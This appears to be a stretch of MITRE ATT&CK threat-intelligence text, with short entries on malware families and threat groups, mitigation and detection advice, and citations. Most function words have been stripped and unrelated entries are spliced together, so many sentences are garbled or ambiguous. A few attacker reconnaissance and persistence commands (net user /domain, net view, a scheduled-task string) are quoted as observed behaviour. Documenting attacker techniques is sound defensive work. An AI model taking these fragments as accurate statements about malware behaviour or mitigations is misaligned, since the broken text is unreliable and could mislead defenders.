Disable/restrict WinRM Service prevent PowerShell remote execution. [XCSSET](https://attack.mitre.org/software/S0658) exfiltrates data stolen C2 channel.(Citation: trendmicro xcsset xcode project 2020) [Taidoor](https://attack.mitre.org/software/S0011) <code>DeleteFileA</code> remove files infected hosts.(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021) [InvisiMole](https://attack.mitre.org/software/S0260) zlib compress decompress data.(Citation: ESET InvisiMole June 2018)(Citation: ESET InvisiMole June 2020) disabling embedded files Office programs, OneNote, Protected View.(Citation: Enigma Reviving DDE Jan 2018)(Citation: GitHub Disable DDEAUTO Oct 2017) (Citation: Cybereason Valak 2020)(Citation: Unit 42 Valak July 2020)(Citation: Unit 42 TA551 Jan 2021)(Citation: Secureworks GOLD CABIN) endpoint security solutions configured block types behaviors process injection/memory tampering based common sequences indicators (ex: execution specific API functions). [Diavol](https://attack.mitre.org/software/S0659) `ENMDSKS` command enumerates network shares.(Citation: Fortinet Diavol July 2021)  Monitor newly constructed containers [SLOTHFULMEDIA](https://attack.mitre.org/software/S0533) keylogging capability.(Citation: CISA MAR SLOTHFULMEDIA October 2020) [Lazarus Group](https://attack.mitre.org/groups/G0032) malware IndiaIndia checks Registry HKCU HKLM determine applications present, including SecureCRT, Terminal Services, RealVNC, TightVNC, UltraVNC, Radmin, mRemote, TeamViewer, FileZilla, pcAnyware, Remote Desktop. [Lazarus Group](https://attack.mitre.org/groups/G0032) malware sample checks presence Registry key:<code>HKEY_CURRENT_USER\Software\Bitcoin\Bitcoin-Qt</code>.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Loaders)(Citation: McAfee Lazarus Resurfaces Feb 2018) [WhisperGate](https://attack.mitre.org/software/S0689) download execute AdvancedRun.exe disable Windows Defender Theat Protection service set exclusion path C:\ drive.(Citation: Unit 42 WhisperGate January 2022)(Citation: Cisco Ukraine Wipers January 2022)(Citation: Medium S2W WhisperGate January 2022) [PingPull](https://attack.mitre.org/software/S1031) variant communicate C2 servers HTTPS.(Citation: Unit 42 PingPull Jun 2022) [Windigo](https://attack.mitre.org/groups/G0124) script detect installed software targeted systems.(Citation: ESET ForSSHe December 2018) [OilRig](https://attack.mitre.org/groups/G0049) <code>net user</code>, <code>net user /domain</code>, <code>net “domain admins” /domain</code>, <code>net “Exchange Trusted Subsystem” /domain</code> account listings victim.(Citation: Palo Alto OilRig 2016) [CharmPower](https://attack.mitre.org/software/S0674) send additional modules C2 encrypted simple substitution cipher.(Citation: Check APT35 CharmPower January 2022) [Empire](https://attack.mitre.org/software/S0363) send data gathered target command control channel.(Citation: Github PowerShell Empire)(Citation: Talos Frankenstein June 2019) [Chimera](https://attack.mitre.org/groups/G0114) HTTPS C2 communications.(Citation: NCC Chimera January 2021) [Squirrelwaffle](https://attack.mitre.org/software/S1030) decrypted files payloads XOR-based algorithm.(Citation: ZScaler Squirrelwaffle Sep 2021)(Citation: Netskope Squirrelwaffle Oct 2021) [Pupy](https://attack.mitre.org/software/S0192) enumerate local Linux hosts logged users Windows hosts.(Citation: GitHub Pupy) [Mis-Type](https://attack.mitre.org/software/S0084) create file command <code>cmd.exe /c ipconfig /all</code>.(Citation: Cylance Dust Storm) [Zeus Panda](https://attack.mitre.org/software/S0330) checks running processes victim’s machine.(Citation: GDATA Zeus Panda June 2017) successful injection [SUNBURST](https://attack.mitre.org/software/S0559), [SUNSPOT](https://attack.mitre.org/software/S0562) deleted temporary file created named <code>InventoryManager.bk</code> restoring original SolarWinds Orion source code software library.(Citation: CrowdStrike SUNSPOT Implant January 2021) [Lazarus Group](https://attack.mitre.org/groups/G0032) multiple proxies obfuscate network traffic victims.(Citation: US-CERT FALLCHILL Nov 2017)(Citation: TrendMicro macOS Dacls 2020) [Machete](https://attack.mitre.org/groups/G0095) batch files initiate additional downloads malicious files.(Citation: 360 Machete Sep 2020) [Okrum](https://attack.mitre.org/software/S0439) communication C2.(Citation: ESET Okrum July 2019) [Socksbot](https://attack.mitre.org/software/S0273) creates suspended svchost process injects DLL it.(Citation: TrendMicro Patchwork Dec 2017) [BabyShark](https://attack.mitre.org/software/S0414) [PowerShell](https://attack.mitre.org/techniques/T1059/001)-based remote administration ability implement PowerShell C# based keylogger.(Citation: Unit42 BabyShark Apr 2019) [BADCALL](https://attack.mitre.org/software/S0245) encrypts C2 traffic XOR/ADD cipher.(Citation: US-CERT BADCALL) [Astaroth](https://attack.mitre.org/software/S0373) encodes data Base64 sending C2 server. (Citation: Cofense Astaroth Sept 2018) [SharpStage](https://attack.mitre.org/software/S0546) legitimate service evading detection.(Citation: Cybereason Molerats Dec 2020)  [Ragnar Locker](https://attack.mitre.org/software/S0481) cmd.exe batch scripts execute commands.(Citation: Sophos Ragnar 2020) [Carbanak](https://attack.mitre.org/software/S0030) checks Registry key <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings</code> proxy configurations information.(Citation: FireEye CARBANAK June 2017) Monitor executed commands arguments collect Keychain data acquire credentials. [OLDBAIT](https://attack.mitre.org/software/S0138) installs <code>%ALLUSERPROFILE%\\Application Data\Microsoft\MediaPlayer\updatewindws.exe</code>; directory missing space file missing letter "o."(Citation: FireEye APT28) [Aria-body](https://attack.mitre.org/software/S0456) ability identify location, public IP address, domain compromised host.(Citation: CheckPoint Naikon 2020) [TrickBot](https://attack.mitre.org/software/S0266) PowerShell download payloads, documents, upload data command control servers. 
 (Citation: Bitdefender Trickbot VNC module Whitepaper 2021) [Lazarus Group](https://attack.mitre.org/groups/G0032) queried active directory server list accounts, including administrator accounts.(Citation: ESET Lazarus Jun 2020) [Cobalt Strike](https://attack.mitre.org/software/S0154) credentials commands spawn processes local user account.(Citation: cobaltstrike manual)(Citation: CobaltStrike Daddy 2017) [Metamorfo](https://attack.mitre.org/software/S0455) encrypted payloads strings.(Citation: Medium Metamorfo Apr 2020)(Citation: ESET Casbaneiro Oct 2019) [menuPass](https://attack.mitre.org/groups/G0045) global service provider's IP proxy C2 traffic victim.(Citation: FireEye APT10 April 2017)(Citation: FireEye APT10 Sept 2018) [FIN7](https://attack.mitre.org/groups/G0046) WMI install malware targeted systems.(Citation: eSentire FIN7 July 2021) [NanHaiShu](https://attack.mitre.org/software/S0228) executes additional VBScript code victim's machine.(Citation: fsecure NanHaiShu July 2016) [DarkVishnya](https://attack.mitre.org/groups/G0105) scanned network public shared folders.(Citation: Securelist DarkVishnya Dec 2018) Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level. [Mustang Panda](https://attack.mitre.org/groups/G0129) leveraged legitimate email marketing service SMTP2Go phishing campaigns.(Citation: Proofpoint TA416 Europe March 2022) [SombRAT](https://attack.mitre.org/software/S0615) collected data files compromised host.(Citation: BlackBerry CostaRicto November 2020)(Citation: CISA AR21-126A FIVEHANDS 2021) Policy configure block modifications Terminal Services parameters Registry.(Citation: Services Fundamentals) [GRIFFON](https://attack.mitre.org/software/S0417) reconnaissance module retrieve Windows domain membership information.(Citation: SecureList Griffon 2019) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors gained initial access exploiting vulnerabilities JBoss webservers.(Citation: FoxIT Wocao December 2019) Monitoring creation (sub)keys Windows Registry reveal malicious attempts modify trust settings, installation root certificates. Installed root certificates located Registry under <code>HKLM\SOFTWARE\Microsoft\EnterpriseCertificates\Root\Certificates\</code> and </code>[HKLM HKCU]\Software[\Policies\]\Microsoft\SystemCertificates\Root\Certificates\</code>. subset root certificates consistent Windows systems comparison: (Citation: Tripwire AppUNBlocker)
* 18F7C1FCC3090203FD5BAA2F861A754976C8DD25
* 245C97DF7514E7CF2DF8BE72AE957B9E04741E85
* 3B1EFD3A66EA28B16697394703A72CA340A05BD5
* 7F88CD7223F3C813818C994614A89C99FA3B5247
* 8F43288AD272F3103B6FB1428485EA3014C0BCFE
* A43489159A520F0D93D032CCAF37E7FE20A8B419
* BE36A4562FB2EE05DBB3D32323ADF445084ED656
* CDD4EEAE6000AC7F40C3802C171E30148030C072 [REvil](https://attack.mitre.org/software/S0496) query Registry random file extensions append encrypted files.(Citation: Secureworks REvil September 2019) [ZxShell](https://attack.mitre.org/software/S0412) ports 1985 1986 HTTP/S communication.(Citation: Talos ZxShell Oct 2014) [Gamaredon Group](https://attack.mitre.org/groups/G0047) embedded malicious macros document templates, executed VBScript. [Gamaredon Group](https://attack.mitre.org/groups/G0047) delivered Outlook VBA projects embedded macros.(Citation: TrendMicro Gamaredon April 2020)(Citation: ESET Gamaredon June 2020)(Citation: CERT-EE Gamaredon January 2021)(Citation: Actinium February 2022)(Citation: Secureworks IRON TILDEN Profile) [APT29](https://attack.mitre.org/groups/G0016) list users roles Exchange server <code>Get-ManagementRoleAssignment</code>.(Citation: Volexity SolarWinds) [Night Dragon](https://attack.mitre.org/campaigns/C0002), threat actors [zwShell](https://attack.mitre.org/software/S0350) establish remote control connected machine command-line shells.(Citation: McAfee Night Dragon) [TrailBlazer](https://attack.mitre.org/software/S0682) random identifier strings obscure C2 operations result codes.(Citation: CrowdStrike StellarParticle January 2022) [AppleSeed](https://attack.mitre.org/software/S0622) decode payload prior execution.(Citation: Malwarebytes Kimsuky June 2021) [Volgmer](https://attack.mitre.org/software/S0180) custom binary protocol beacon C2 server. XOR encrypting communications.(Citation: US-CERT Volgmer Nov 2017)(Citation: US-CERT Volgmer 2 Nov 2017) [XCSSET](https://attack.mitre.org/software/S0658) dropped malicious applet app's `.../Contents/MacOS/` folder launched app bypass Gatekeeper's security checks launch apps (prior macOS 13).(Citation: Application Bundle Manipulation Brandon Dalton) [ComRAT](https://attack.mitre.org/software/S0126) encryption base64 obfuscate orchestrator code Registry. [ComRAT](https://attack.mitre.org/software/S0126) encrypted virtual file AES-256 XTS mode encoded PowerShell scripts.(Citation: ESET ComRAT 2020)(Citation: CISA ComRAT Oct 2020)  Monitor file delete alter generated artifacts persistence host system. [Mythic](https://attack.mitre.org/software/S0699) supports DNS-based C2 profiles.(Citation: Mythc Documentation)	 [APT32](https://attack.mitre.org/groups/G0050) spearphishing emails malicious executable disguised document spreadsheet.(Citation: ESET OceanLotus)(Citation: Cybereason Oceanlotus 2017)(Citation: Cybereason Cobalt Kitty 2017)(Citation: ESET OceanLotus Mar 2019)(Citation: FireEye APT32 April 2020)(Citation: Amnesty Intl. Ocean Lotus February 2021) Implement secure 2FA/MFA mechanisms replacement simple push one-click 2FA/MFA options. example, users enter one-time code login screen 2FA/MFA application utilizing out-of-band 2FA/MFA mechanisms (such rotating code-based hardware tokens providing rotating codes accompanying user pin) secure. Furthermore, change default configurations implement limits maximum 2FA/MFA request prompts users period time.(Citation: MFA Fatigue Attacks - PortSwigger) [Gamaredon Group](https://attack.mitre.org/groups/G0047)'s malware screenshots compromised minute.(Citation: ESET Gamaredon June 2020)	 Monitor third-party application logging, messaging, artifacts rely user running malicious image facilitate execution. implementations [CHOPSTICK](https://attack.mitre.org/software/S0023) communicate C2 HTTP.(Citation: ESET Sednit 2) [Saint Bot](https://attack.mitre.org/software/S1018) download additional files compromised host.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) [UNC2452](https://attack.mitre.org/groups/G0118) devices allowed IDs active sync <code>Set-CASMailbox</code>, allowing copies victim mailboxes. additional permissions (such Mail.Read Mail.ReadWrite) compromised Application Service Principals.(Citation: Volexity SolarWinds)(Citation: - Customer Guidance Nation-State Cyber Attacks) Windows 10, enable Attack Surface Reduction (ASR) rules prevent DDE attacks spawning child processes Office programs. (Citation: ASR Nov 2017) (Citation: Enigma Reviving DDE Jan 2018) [Pupy](https://attack.mitre.org/software/S0192) user PowerView execute “net user” commands create domain accounts.(Citation: GitHub Pupy) [FIN8](https://attack.mitre.org/groups/G0061) malicious e-mail attachments lure victims executing malware.(Citation: FireEye Obfuscation June 2017)(Citation: FireEye Fin8 2016)(Citation: FireEye Enemy FIN8 Aug 2016) Monitor newly executed processes abuse Windows safe mode disable endpoint defenses. Ensure permissions disallow services permissions level created interacted user permission level. Monitor files viewed isolation steal data exfiltrating symmetrically encrypted network protocol existing command control channel. [APT38](https://attack.mitre.org/groups/G0082) command-line tunneler, NACHOCHEESE, access victim’s machine.(Citation: FireEye APT38 Oct 2018) [RogueRobin](https://attack.mitre.org/software/S0270) gathers IP address domain victim’s machine.(Citation: Unit 42 DarkHydrus July 2018) [MuddyWater](https://attack.mitre.org/groups/G0069) custom tool creating reverse shells.(Citation: Symantec MuddyWater Dec 2018) Ensure permissions server process required built-in accounts; instead, create specific accounts limit unnecessary access permissions overlap multiple systems. (Citation: acunetix Server Secuirty) (Citation: NIST Server Security July 2008) Monitor executed commands arguments modifications variables files loading shared libraries LD_PRELOAD Linux DYLD_INSERT_LIBRARIES macOS. [Pupy](https://attack.mitre.org/software/S0192) send screenshots files, keylogger data, files, recorded audio C2 server.(Citation: GitHub Pupy) Monitor login hook files (<code>/Library/Preferences/com.apple.loginwindow.plist</code>), unusual accounts normal administration duties. [BISCUIT](https://attack.mitre.org/software/S0017) malware secondary fallback command control server contacted primary command control server.(Citation: Mandiant APT1)(Citation: Mandiant APT1 Appendix) [PinchDuke](https://attack.mitre.org/software/S0048) transfers files compromised host HTTPS C2 server.(Citation: F-Secure Dukes) [StrongPity](https://attack.mitre.org/software/S0491) compress encrypt archived files multiple .sft files repeated xor encryption scheme.(Citation: Talos Promethium June 2020)(Citation: Bitdefender StrongPity June 2020) [hcdLoader](https://attack.mitre.org/software/S0071) command-line access compromised system.(Citation: Dell Lateral Movement) [APT37](https://attack.mitre.org/groups/G0067) credential stealer ZUMKONG emails credentials victim POST requests.(Citation: FireEye APT37 Feb 2018) (Citation: F-Secure Dukes) [UBoatRAT](https://attack.mitre.org/software/S0333) start command shell.(Citation: PaloAlto UBoatRAT Nov 2017) strong passphrases private cracking difficult. [Lazarus Group](https://attack.mitre.org/groups/G0032) multiple types encryption encoding payloads, including AES, Caracachs, RC4, XOR, Base64, tricks creating aliases code [Native API](https://attack.mitre.org/techniques/T1106) function names.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Loaders)(Citation: Novetta Blockbuster RATs)(Citation: McAfee Lazarus Resurfaces Feb 2018)(Citation: TrendMicro macOS Dacls 2020)(Citation: ESET Lazarus Jun 2020)(Citation: McAfee Lazarus Jul 2020)(Citation: McAfee Lazarus Nov 2020)(Citation: ClearSky Lazarus Aug 2020)(Citation: Lazarus APT January 2022)(Citation: Qualys LolZarus) [LitePower](https://attack.mitre.org/software/S0680) query Registry execute hijacking.(Citation: Kaspersky WIRTE November 2021) (Citation: Symantec Elfin Mar 2019) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. discovery modules [Duqu](https://attack.mitre.org/software/S0038) collect process details.(Citation: Symantec W32.Duqu) [esentutl](https://attack.mitre.org/software/S0404) files to/from remote share.(Citation: LOLBAS Esentutl) Monitor newly constructed files configure settings automatically execute program boot logon maintain persistence gain higher-level privileges compromised systems. technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. Efforts focus minimizing sensitivity data external parties. (Citation: Symantec Chafer February 2018) [Dacls](https://attack.mitre.org/software/S0497) HTTPS C2 communications.(Citation: SentinelOne Lazarus macOS July 2020)(Citation: TrendMicro macOS Dacls 2020) Monitor security settings MFA logon requirements, Azure Conditional Access Policies registration MFA applications. (Citation: Kaspersky Dtrack) Patch BIOS EFI necessary. Enterprise email solutions monitoring mechanisms include ability audit inbox rules regular basis. 

In Exchange environment, Administrators <code>Get-InboxRule</code> discover remove malicious inbox rules.(Citation: Get-InboxRule) [Komplex](https://attack.mitre.org/software/S0162) trojan supports file deletion.(Citation: Sofacy Komplex Trojan) [FALLCHILL](https://attack.mitre.org/software/S0181) delete malware artifacts victim.(Citation: US-CERT FALLCHILL Nov 2017) (Citation: CrowdStrike Putter Panda) [APT1](https://attack.mitre.org/groups/G0006) pass hash.(Citation: Mandiant APT1) (Citation: DHS/CISA Ransomware Targeting Healthcare October 2020)(Citation: FireEye KEGTAP SINGLEMALT October 2020)(Citation: Sophos Ryuk Attack October 2020) [Operation Honeybee](https://attack.mitre.org/campaigns/C0006), threat actors batch files reduced fingerprint compromised deleting malware-related files.(Citation: McAfee Honeybee)  [HyperBro](https://attack.mitre.org/software/S0398) legitimate application sideload DLL decrypt, decompress, payload.(Citation: Unit42 Emissary Panda 2019)(Citation: Trend Micro Iron Tiger April 2021) [FYAnti](https://attack.mitre.org/software/S0628) download additional payloads compromised host.(Citation: Securelist APT10 March 2021)	  [FinFisher](https://attack.mitre.org/software/S0182) hooks processes modifying IAT pointers CreateWindowEx.(Citation: FinFisher Citation)(Citation: Elastic Process Injection July 2017) [APT18](https://attack.mitre.org/groups/G0026) actors leverage legitimate credentials log external remote services.(Citation: RSA2017 Detect Respond Adair) [GALLIUM](https://attack.mitre.org/groups/G0093) DLL side-loading covertly load [PoisonIvy](https://attack.mitre.org/software/S0012) memory victim machine.(Citation: Cybereason Soft Cell June 2019) <code>net view \\remotesystem</code> <code>net share</code> commands [Net](https://attack.mitre.org/software/S0039) shared drives directories remote local systems respectively.(Citation: Savill 1999) [ZIRCONIUM](https://attack.mitre.org/groups/G0128) Python-based implants interact compromised hosts.(Citation: Google Election Threats October 2020)(Citation: Zscaler APT31 Covid-19 October 2020) [LightNeuron](https://attack.mitre.org/software/S0395) exfiltrates data email C2 channel.(Citation: ESET LightNeuron 2019) (Citation: Dell TG-3390) Segment externally facing servers services rest network DMZ separate hosting infrastructure. Monitor newly constructed network connections processes performing collection activity, involving abnormal/untrusted hosts.  Monitor newly constructed network device configuration image known-good version discover unauthorized boot, startup configuration, running OS. (Citation: Cisco IOS Software Integrity Assurance - Secure Boot) (Citation: Cisco IOS Software Integrity Assurance - Image File Verification) process accomplished comparison run-time memory, non-trivial require assistance vendor. [LaZagne](https://attack.mitre.org/software/S0349) credentials browsers Google Chrome, Internet Explorer, Firefox.(Citation: GitHub LaZagne Dec 2018) [FatDuke](https://attack.mitre.org/software/S0512) identify MAC address target computer.(Citation: ESET Dukes October 2019) (Citation: Cybereason Soft Cell June 2019)(Citation: GALLIUM December 2019) Monitor logging list settings extracted, ex. Windows EID 4798 4799. Patch BIOS EFI necessary. Audit Kerberos authentication credential events review discrepancies. Unusual remote authentication events correlate suspicious activity (such writing executing binaries) malicious activity. [Mori](https://attack.mitre.org/software/S1047) `regsvr32.exe` DLL execution.(Citation: DHS CISA AA22-055A MuddyWater February 2022) [OSX/Shlayer](https://attack.mitre.org/software/S0402) executed .command script hidden directory mounted DMG.(Citation: Carbon Black Shlayer Feb 2019) [Sakula](https://attack.mitre.org/software/S0074) C2.(Citation: Dell Sakula) [HEXANE](https://attack.mitre.org/groups/G1001) cloud services, including OneDrive, data exfiltration.(Citation: POLONIUM June 2022) [Matryoshka](https://attack.mitre.org/software/S0167) capable providing Meterpreter access.(Citation: ClearSky Wilted Tulip July 2017) [MoleNet](https://attack.mitre.org/software/S0553) execute commands command utility.(Citation: Cybereason Molerats Dec 2020) [APT33](https://attack.mitre.org/groups/G0064) variety publicly tools [LaZagne](https://attack.mitre.org/software/S0349) gather credentials.(Citation: Symantec Elfin Mar 2019)(Citation: FireEye APT33 Guardrail) Restrict access <code>authorized_keys</code> file. Check common UAC bypass weaknesses Windows systems aware risk posture address issues appropriate.(Citation: Github UACMe) [Bumblebee](https://attack.mitre.org/software/S1039) loader support `Dij` command ability inject DLLs memory processes.(Citation: Proofpoint Bumblebee April 2022)(Citation: Symantec Bumblebee June 2022) [APT19](https://attack.mitre.org/groups/G0073) configured payload inject rundll32.exe.(Citation: FireEye APT19) [TEMP.Veles](https://attack.mitre.org/groups/G0088) VPN persist victim environment.(Citation: FireEye TRITON 2019) [APT29](https://attack.mitre.org/groups/G0016) created self-signed digital certificates enable mutual TLS authentication malware.(Citation: PWC WellMess July 2020)(Citation: PWC WellMess C2 August 2020) [MacMa](https://attack.mitre.org/software/S1016) collect IP addresses compromised host.(Citation: ESET DazzleSpy Jan 2022) [Inception](https://attack.mitre.org/groups/G0100) chains compromised routers proxy C2 communications cloud service providers.(Citation: Symantec Inception Framework March 2018) [Carbon](https://attack.mitre.org/software/S0335) <code>net group</code> command.(Citation: GovCERT Carbon 2016) [Operation Spalax](https://attack.mitre.org/campaigns/C0005), threat actors OneDrive MediaFire host payloads.(Citation: ESET Operation Spalax Jan 2021) Monitor account activity attempts share data, snapshots, backups untrusted unusual accounts cloud service provider. Monitor anomalous file transfer activity accounts untrusted VPCs. [Night Dragon](https://attack.mitre.org/campaigns/C0002), threat actors software packing tools.(Citation: McAfee Night Dragon) (Citation: Palo Alto OilRig 2016)(Citation: FireEye APT34 Dec 2017) (Citation: ESET TeleBots Oct 2018)(Citation: ANSSI Sandworm January 2021) [Reaver](https://attack.mitre.org/software/S0172) deletes original dropped file victim.(Citation: Palo Alto Reaver Nov 2017) [NanHaiShu](https://attack.mitre.org/software/S0228) gather victim proxy server.(Citation: Proofpoint Leviathan Oct 2017) [yty](https://attack.mitre.org/software/S0248) <code>net view</code> command discovery.(Citation: ASERT Donot March 2018) [PUNCHBUGGY](https://attack.mitre.org/software/S0196) gather AVs registered system.(Citation: Morphisec ShellTea June 2019)	 [Metamorfo](https://attack.mitre.org/software/S0455) native WINAPI calls.(Citation: Medium Metamorfo Apr 2020)(Citation: Fortinet Metamorfo Feb 2020) [Comnie](https://attack.mitre.org/software/S0244) <code>tasklist</code> view running processes victim’s machine.(Citation: Palo Alto Comnie) (Citation: Trend Micro Tick November 2019) [Operation Honeybee](https://attack.mitre.org/campaigns/C0006), stolen data copied file format `From <COMPUTER-NAME> (<Month>-<Day> <Hour>-<Minute>-<Second>).txt` prior compression, encoding, exfiltration.(Citation: McAfee Honeybee) [OilRig](https://attack.mitre.org/groups/G0049) abused Outlook feature persistence. [OilRig](https://attack.mitre.org/groups/G0049) CVE-2017-11774 roll initial patch designed protect abuse.(Citation: FireEye Outlook Dec 2019) Require signed binaries images. [MCMD](https://attack.mitre.org/software/S0500) ability remove set Registry Keys, including persistence.(Citation: Secureworks MCMD July 2019) [ZxShell](https://attack.mitre.org/software/S0412) ports 1985 1986 communication.(Citation: Talos ZxShell Oct 2014)  [APT32](https://attack.mitre.org/groups/G0050) <code>net view</code> command shares available, including administrative shares <code>C$</code> <code>ADMIN$</code>.(Citation: Cybereason Cobalt Kitty 2017) [Leviathan](https://attack.mitre.org/groups/G0065) multi-hop proxies disguise source malicious traffic.(Citation: CISA AA21-200A APT40 July 2021) [Ursnif](https://attack.mitre.org/software/S0386) droppers objects execute malware's executable payload.(Citation: Bromium Ursnif Mar 2017) [Hydraq](https://attack.mitre.org/software/S0203) creates backdoor remote attackers retrieve IP addresses compromised machines.(Citation: Symantec Trojan.Hydraq Jan 2010)(Citation: Symantec Hydraq Jan 2010) [Attor](https://attack.mitre.org/software/S0438)'s installer plugin schedule rundll32.exe load dispatcher.(Citation: ESET Attor Oct 2019) [PowGoop](https://attack.mitre.org/software/S1046) receive encrypted commands C2.(Citation: DHS CISA AA22-055A MuddyWater February 2022) Ensure applications Apple's developer guidance enables hardened runtime.(Citation: Apple Developer Doco Hardened Runtime) adversary administrator level access local technique; restrict users accounts privileges require.   [Shamoon](https://attack.mitre.org/software/S0140) creates service named “ntssrv” attempts legitimate; service's display “Microsoft Network Realtime Inspection Service” description “Helps guard time change attempts targeting newly discovered vulnerabilities network time protocols.” versions create "MaintenaceSrv" service, misspells word "maintenance."(Citation: Palo Alto Shamoon Nov 2016)(Citation: McAfee Shamoon December 2018) [Saint Bot](https://attack.mitre.org/software/S1018) C2 communications.(Citation: Malwarebytes Saint Bot April 2021) [Grandoreiro](https://attack.mitre.org/software/S0531) send data retrieves C2 server.(Citation: ESET Grandoreiro April 2020) Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level. Signatures unique indicators protocols based specific C2 protocol adversary tool, malware families versions. Adversaries change tool C2 signatures time construct protocols avoid detection common defensive tools.(Citation: University Birmingham C2) [Night Dragon](https://attack.mitre.org/campaigns/C0002), threat actors SQL injection exploits extranet servers gain access.(Citation: McAfee Night Dragon) Monitor SMB traffic TCP ports 139, 445 UDP port 137 WebDAV traffic attempting exit network unknown external systems.If attempts detected, investigate endpoint data sources root cause. [Empire](https://attack.mitre.org/software/S0363) enumerate host OS, architecture, domain name, applied patches, more.(Citation: Github PowerShell Empire)(Citation: Talos Frankenstein June 2019) [JPIN](https://attack.mitre.org/software/S0201) enumerate Registry keys.(Citation: PLATINUM April 2016) Monitor MBR VBR occur indicators suspicious activity analysis. snapshots MBR VBR compare samples. [Ursnif](https://attack.mitre.org/software/S0386) hooked APIs perform wide variety theft, monitoring traffic browsers.(Citation: TrendMicro Ursnif Mar 2015) [LockerGoga](https://attack.mitre.org/software/S0372) observed shutting infected systems.(Citation: Wired Lockergoga 2019) [ABK](https://attack.mitre.org/software/S0469) ability decrypt AES encrypted payloads.(Citation: Trend Micro Tick November 2019) [APT29](https://attack.mitre.org/groups/G0016) downloaded additional tools, [TEARDROP](https://attack.mitre.org/software/S0560) malware [Cobalt Strike](https://attack.mitre.org/software/S0154), compromised host initial access.(Citation: FireEye SUNBURST Backdoor December 2020) [Final1stspy](https://attack.mitre.org/software/S0355) obfuscates strings base64 encoding.(Citation: Unit 42 Nokki Oct 2018) [Hikit](https://attack.mitre.org/software/S0009) attempted disable driver signing verification tampering Registry prior loading rootkit driver component.(Citation: FireEye HIKIT Rootkit 2) [POWERTON](https://attack.mitre.org/software/S0371) HTTP/HTTPS C2 traffic.(Citation: FireEye APT33 Guardrail) [ROADTools](https://attack.mitre.org/software/S0684) enumerate Azure applications service principals.(Citation: Roadtools)	 [Inception](https://attack.mitre.org/groups/G0100) enumerated installed software compromised systems.(Citation: Symantec Inception Framework March 2018) [Empire](https://attack.mitre.org/software/S0363) harvest clipboard data Windows macOS systems.(Citation: Github PowerShell Empire) [APT33](https://attack.mitre.org/groups/G0064) variety publicly tools Gpppassword gather credentials.(Citation: Symantec Elfin Mar 2019)(Citation: FireEye APT33 Guardrail) [WannaCry](https://attack.mitre.org/software/S0366) searches variety user files file extension encrypting RSA AES, including Office, PDF, image, audio, video, source code, archive/compression format, key certificate files.(Citation: LogRhythm WannaCry)(Citation: FireEye WannaCry 2017) module [Prikormka](https://attack.mitre.org/software/S0113) collects victim IP addresses MAC addresses.(Citation: ESET Operation Groundbait) [POWERSTATS](https://attack.mitre.org/software/S0223) detected security tools.(Citation: FireEye MuddyWater Mar 2018) Limit privileges user accounts authorized users edit rc.common file. [Bandook](https://attack.mitre.org/software/S0234) launched starting iexplore.exe replacing [Bandook](https://attack.mitre.org/software/S0234)'s payload.(Citation: Lookout Dark Caracal Jan 2018)(Citation: EFF Manul Aug 2016)(Citation: CheckPoint Bandook Nov 2020) [Nomadic Octopus](https://attack.mitre.org/groups/G0133) attempted [Octopus](https://attack.mitre.org/software/S0340)  Telegram Messenger Russian interface.(Citation: Securelist Octopus Oct 2018) adversaries leverage serverless functions infrastructure (ex: command control), unique characteristics adversary software, known.(Citation: ThreatConnect Infrastructure Dec 2020) activity visibility target organization, detection behavior difficult. Detection efforts focused stages adversary lifecycle.  (Citation: Kaspersky Ferocious Kitten Jun 2021) [Darkhotel](https://attack.mitre.org/groups/G0012) spearphishing emails malicious RAR .LNK attachments.(Citation: Securelist Darkhotel Aug 2015)(Citation: DUBNIUM July 2016) [Lokibot](https://attack.mitre.org/software/S0447) ability discover username infected host.(Citation: FSecure Lokibot November 2019) [POWERSTATS](https://attack.mitre.org/software/S0223) Mshta.exe execute additional payloads compromised hosts.(Citation: FireEye MuddyWater Mar 2018) [Maze](https://attack.mitre.org/software/S0449) operators VirtualBox Windows 7 virtual machine ransomware; virtual machine's configuration file mapped shared network drives target company, [Maze](https://attack.mitre.org/software/S0449) encrypt files shared drives local machine.(Citation: Sophos Maze VM September 2020)  [OopsIE](https://attack.mitre.org/software/S0264) concatenates decompresses multiple resources load embedded .Net Framework assembly.(Citation: Unit 42 OopsIE! Feb 2018) [Pysa](https://attack.mitre.org/software/S0583) Python scripts deploy ransomware.(Citation: CERT-FR PYSA April 2020) (Citation: Cylance Cleaver) (Citation: DustySky)(Citation: DustySky2)(Citation: Kaspersky MoleRATs April 2019) Monitor API calls, loaded payload, token manipulation careful analysis user network activity, examination running processes, correlation endpoint network behavior. Windows API calls payload advantage manipulate access tokens <code>LogonUser</code> (Citation: LogonUser), <code>DuplicateTokenEx</code>(Citation: DuplicateTokenEx), <code>ImpersonateLoggedOnUser</code>(Citation: ImpersonateLoggedOnUser)). referenced Windows API information. [Industroyer](https://attack.mitre.org/software/S0604) supplied user credentials execute processes services.(Citation: ESET Industroyer) [GRIFFON](https://attack.mitre.org/software/S0417) reconnaissance module retrieve time system.(Citation: SecureList Griffon 2019)	 Monitor account authentications MFA credentials user account authenticating entity. Monitor executed commands arguments actions gather network information, nltest /domain_trusts. Remote access tools built-in features interact Windows API gather information. [Lazarus Group](https://attack.mitre.org/groups/G0032) multi-stage malware components inject stages separate processes.(Citation: Lazarus APT January 2022) [Proxysvc](https://attack.mitre.org/software/S0238) delete files attacker remove disk batch file.(Citation: McAfee GhostSecret) [MegaCortex](https://attack.mitre.org/software/S0576) checked CPUs avoid sandbox emulator.(Citation: IBM MegaCortex)  [Chimera](https://attack.mitre.org/groups/G0114) direct Windows calls leveraging Dumpert.(Citation: Cycraft Chimera April 2020) [Frankenstein](https://attack.mitre.org/campaigns/C0001), threat actors established persistence scheduled task command: `/Create /F /SC DAILY /ST 09:00 /TN WinUpdate /TR`, named "WinUpdate" (Citation: Talos Frankenstein June 2019) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors executed commands installed [Tor](https://attack.mitre.org/software/S0183) exit nodes.(Citation: FoxIT Wocao December 2019) [Leafminer](https://attack.mitre.org/groups/G0077) tools 